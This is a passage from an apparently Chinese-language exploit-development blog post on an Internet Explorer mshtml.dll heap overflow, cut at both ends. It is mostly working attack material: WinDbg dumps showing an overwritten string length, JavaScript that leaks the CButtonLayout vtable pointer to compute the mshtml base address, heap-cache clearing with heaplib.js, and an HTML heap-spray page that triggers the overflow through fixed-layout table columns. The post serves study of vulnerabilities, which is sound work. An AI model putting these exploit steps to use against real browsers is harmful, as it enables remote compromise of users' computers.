class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; db 02cd1e70 l400</span><br><span class="line">02cd1e70  05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00  ................</span><br><span class="line">02cd1e80  45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00  E.E.A.E.X@......</span><br><span class="line">02cd1e90  05 14 00 00 05 14 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">02cd1ea0  41 00 45 00 58 40 01 00-05 14 00 00 05 14 00 00  A.E.X@..........</span><br><span class="line">02cd1eb0  05 14 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">02cd1ec0  58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00  X@..............</span><br><span class="line">02cd1ed0  00 00 00 00 45 00 45 00-41 00 45 00 58 40 01 00  ....E.E.A.E.X@..</span><br><span class="line">02cd1ee0  05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00  ................</span><br><span class="line">02cd1ef0  45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00  E.E.A.E.X@......</span><br><span class="line">02cd1f00  05 14 00 00 05 14 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">02cd1f10  41 00 45 00 58 40 01 00-05 14 00 00 05 14 00 00  A.E.X@..........</span><br><span class="line">02cd1f20  05 14 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">02cd1f30  58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00  X@..............</span><br><span class="line">02cd1f40  00 00 00 00 45 00 45 00-41 00 45 00 58 40 01 00  ....E.E.A.E.X@..</span><br><span class="line">02cd1f50  05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00  ................</span><br><span class="line">02cd1f60  45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00  E.E.A.E.X@......</span><br><span class="line">02cd1f70  05 14 00 00 05 14 00 00-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">02cd1f80  41 00 41 00 58 40 01 00-05 14 00 00 05 14 00 00  A.A.X@..........</span><br><span class="line">02cd1f90  05 14 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">02cd1fa0  58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00  X@..............</span><br><span class="line">02cd1fb0  41 00 41 00 41 00 41 00-41 00 41 00 58 40 01 00  A.A.A.A.A.A.X@..</span><br><span class="line">02cd1fc0  05 14 00 00 05 14 00 00-05 14 00 00 41 00 41 00  ............A.A.</span><br><span class="line">02cd1fd0  41 00 41 00 41 00 41 00-58 40 01 00 05 14 00 00  A.A.A.A.X@......</span><br><span class="line">02cd1fe0  05 14 00 00 05 14 00 00-41 00 41 00 41 00 41 00  ........A.A.A.A.</span><br><span class="line">02cd1ff0  41 00 41 00 58 40 01 00-05 14 00 00 05 14 00 00  A.A.X@..........</span><br><span class="line">02cd2000  05 14 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">02cd2010  58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00  X@..............</span><br><span class="line">02cd2020  41 00 41 00 41 00 41 00-41 00 41 00 58 40 01 00  A.A.A.A.A.A.X@..</span><br><span class="line">02cd2030  05 14 00 00 05 14 00 00-05 14 00 00 41 00 41 00  ............A.A.</span><br><span class="line">02cd2040  41 00 41 00 41 00 41 00-58 40 01 00 05 14 00 00  A.A.A.A.X@......</span><br><span class="line">02cd2050  05 14 00 00 05 14 00 00-41 00 41 00 41 00 41 00  ........A.A.A.A.</span><br><span class="line">02cd2060  41 00 41 00 58 40 01 00-05 14 00 00 05 14 00 00  A.A.X@..........</span><br><span class="line">02cd2070  05 14 00 00 41 00 00 00-03 e3 d4 22 20 28 00 88  ....A......&quot; (..</span><br><span class="line">02cd2080  58 40 01 00 42 00 42 00-42 00 42 00 42 00 42 00  X@..B.B.B.B.B.B.</span><br><span class="line">02cd2090  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd20a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd20b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd20c0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd20d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd20e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd20f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd2100  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd2110  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd2120  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd2130  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd2140  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd2150  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd2160  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02cd2170  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">02cd2180  3c e3 d4 22 61 70 00 8c-f8 3a b2 65 90 05 31 00  &lt;..&quot;ap...:.e..1.</span><br><span class="line">02cd2190  50 7c cd 02 90 3c b2 65-01 00 00 00 00 00 00 00  P|...&lt;.e........</span><br><span class="line">02cd21a0  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02cd21b0  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">02cd21c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02cd21d0  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">02cd21e0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02cd21f0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02cd2200  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02cd2210  00 00 00 00 00 00 00 00-00 00 00 00 38 22 cd 02  ............8&quot;..</span><br><span class="line">02cd2220  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02cd2230  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02cd2240  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02cd2250  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">02cd2260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br></pre></td></tr></table></figure><p></p><p>可以发现这次字符串”AAAA…”区域也明显被覆盖，同时”BBBB…”字符串的长度信息变为了<code>0x00014058</code><br>这意味着”BBBB…”字符串的长度被扩大了，只要再次读取该字符串的内容，位于其后方的<code>CButtonLayout</code>数据也会被一并读取。</p><h3 id="mshtml-dll基址泄露"><a href="#mshtml-dll基址泄露" class="headerlink" title="mshtml.dll基址泄露"></a>mshtml.dll基址泄露</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_leak</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (al[i].length &gt; (<span class="number">0x100</span> - <span class="number">6</span>) / <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> leak = al[i].substring((<span class="number">0x100</span> - <span class="number">6</span>) / <span class="number">2</span> + (<span class="number">2</span> + <span class="number">8</span>) / <span class="number">2</span>, (<span class="number">0x100</span> - <span class="number">6</span>) / <span class="number">2</span> + (<span class="number">2</span> + <span class="number">8</span> + <span class="number">4</span>) / <span class="number">2</span>);</span><br><span class="line">            leak_addr = <span class="built_in">parseInt</span>(leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span>);</span><br><span class="line">            alert(<span class="string">"CbuttonLayout虚表指针: 0x"</span> + leak_addr.toString(<span class="number">16</span>));</span><br><span class="line">            mshtmlbase = leak_addr - <span class="number">0x173af8</span>;</span><br><span class="line">            alert(<span class="string">"mshtml.dll基址ַ: 0x"</span> + mshtmlbase.toString(<span class="number">16</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在al数组中找到长度异常的字符串,前文已经解释过长度为<code>(0x100 - 6) / 2</code>的原因了<br><strong>关于定位虚表指针位置：</strong><br><img src="/post/b72ee585/leak.png" alt="leak.png"><br>由上图便可知虚表指针与字符串起始地址偏移的关系了。</p><p><strong>关于mshtml基址的偏移</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; x mshtml!CButtonLayout::*</span><br><span class="line">65b7519d          mshtml!CButtonLayout::GetThemeClassId (&lt;no parameter info&gt;)</span><br><span class="line">65bf0d9d          mshtml!CButtonLayout::GetInsets (&lt;no parameter info&gt;)</span><br><span class="line">65b23c90          mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">65b75499          mshtml!CButtonLayout::GetAutoSize (&lt;no parameter info&gt;)</span><br><span class="line">65d862f6          mshtml!CButtonLayout::HitTestContent (&lt;no parameter info&gt;)</span><br><span class="line">65b5b4b7          mshtml!CButtonLayout::DrawClientBackground (&lt;no parameter info&gt;)</span><br><span class="line">65b29251          mshtml!CButtonLayout::Init (&lt;no parameter info&gt;)</span><br><span class="line">65b75499          mshtml!CButtonLayout::GetMultiLine (&lt;no parameter info&gt;)</span><br><span class="line">65cf61d8          mshtml!CButtonLayout::s_layoutdesc = &lt;no type information&gt;</span><br><span class="line">65d862e6          mshtml!CButtonLayout::GetBtnHelper (&lt;no parameter info&gt;)</span><br><span class="line">65d86121          mshtml!CButtonLayout::GetFocusShape (&lt;no parameter info&gt;)</span><br><span class="line">65cf61d1          mshtml!CButtonLayout::GetLayoutDesc (&lt;no parameter info&gt;)</span><br><span class="line">65d86281          mshtml!CButtonLayout::DoLayout (&lt;no parameter info&gt;)</span><br><span class="line">65b7519d          mshtml!CButtonLayout::GetWordWrap (&lt;no parameter info&gt;)</span><br><span class="line">65b23af8          mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">65b5b4f2          mshtml!CButtonLayout::DrawClient (&lt;no parameter info&gt;)</span><br><span class="line">65bd32da          mshtml!CButtonLayout::`scalar deleting destructor&apos; (&lt;no parameter info&gt;)</span><br><span class="line">65d85f61          mshtml!CButtonLayout::DrawClientBorder (&lt;no parameter info&gt;)</span><br><span class="line">65bd32da          mshtml!CButtonLayout::`vector deleting destructor&apos; (&lt;no parameter info&gt;)</span><br><span class="line">65bf2394          mshtml!CButtonLayout::GetDefaultSize (&lt;no parameter info&gt;)</span><br><span class="line">0:007&gt; lmm mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">659b0000 65f62000   mshtml     (pdb symbols)</span><br></pre></td></tr></table></figure><p></p><p>虽然我不知道为什么有两个虚表，但是都试试总没错<br>其中第二个虚表的地址与mshtml的偏移和《漏洞战争》中的相同，为<code>0x65b23af8 - 0x659b0000 = 0x‭173af8‬</code><br><img src="/post/b72ee585/vtable.png" alt="vtable.png"><br><img src="/post/b72ee585/base.png" alt="base.png"></p><h2 id="堆喷射"><a href="#堆喷射" class="headerlink" title="堆喷射"></a>堆喷射</h2><p>在成功泄露地址之后，我们接下来开始考虑shellcode的摆放问题。<br>因为javascript中存在一张缓存表，其结构如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CacheEntry bin_1_32     [<span class="number">6</span>];  <span class="comment">// blocks from 1 to 32 bytes</span></span><br><span class="line">CacheEntry bin_33_64    [<span class="number">6</span>];  <span class="comment">// blocks from 33 to 64 bytes</span></span><br><span class="line">CacheEntry bin_65_256   [<span class="number">6</span>];  <span class="comment">// blocks from 65 to 265 bytes</span></span><br><span class="line">CacheEntry bin_257_32768[<span class="number">6</span>];  <span class="comment">// blocks from 257 to 32768 bytes</span></span><br></pre></td></tr></table></figure><p></p><p>在申请字符串的时候会优先考虑该缓存表中是否有合适的内存块，这会使得申请的堆内存位置变得不可靠。<br>所以我们需要想办法清空该缓存，使我们的每次申请都由系统堆进行处理。<br>具体方法参考<a href="https://xz.aliyun.com/t/2107#toc-8" target="_blank" rel="noopener">Plunger technique</a></p><blockquote><p>我们使用6个块作为plunger，将所有较小的块从缓存中移出，然后我们再次分配6个块将plunger取出，就可以清空所有bin</p></blockquote><p>这里我们使用了一个javascript堆管理库，叫做<a href="https://github.com/eegeek1986/heaplib/blob/master/heaplib.js" target="_blank" rel="noopener">heaplib.js</a>，它封装了上述清空缓存表的操作，我们可以直接使用<br>我们先试试一个普通的堆喷射<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"heaplib.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"evil"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> free = <span class="string">"EEEE"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (free.length &lt; <span class="number">480</span>) free += free;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> string1 = <span class="string">"AAAA"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (string1.length &lt; <span class="number">480</span>) string1 += string1;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> string2 = <span class="string">"BBBB"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (string2.length &lt; <span class="number">480</span>) string2 += string2;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> fr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> al = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> div_container = <span class="built_in">document</span>.getElementById(<span class="string">"evil"</span>);</span></span><br><span class="line"><span class="javascript">        div_container.style.cssText = <span class="string">"display:none"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="undefined">            fr[i] = free.substring(0, (0x100 - 6) / 2);</span></span><br><span class="line"><span class="undefined">            al[i] = string1.substring(0, (0x100 - 6) / 2);</span></span><br><span class="line"><span class="undefined">            al[i+1] = string2.substring(0, (0x100 - 6) / 2);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span></span><br><span class="line"><span class="undefined">            div_container.appendChild(obj);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">200</span>; i &lt; <span class="number">500</span>; i += <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="javascript">            fr[i] = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">            CollectGarbage();</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"1"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"2"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"3"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"5"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"6"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"7"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"8"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"9"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"10"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"11"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"12"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"13"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"14"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"15"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"16"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"17"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"18"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"19"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"21"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span 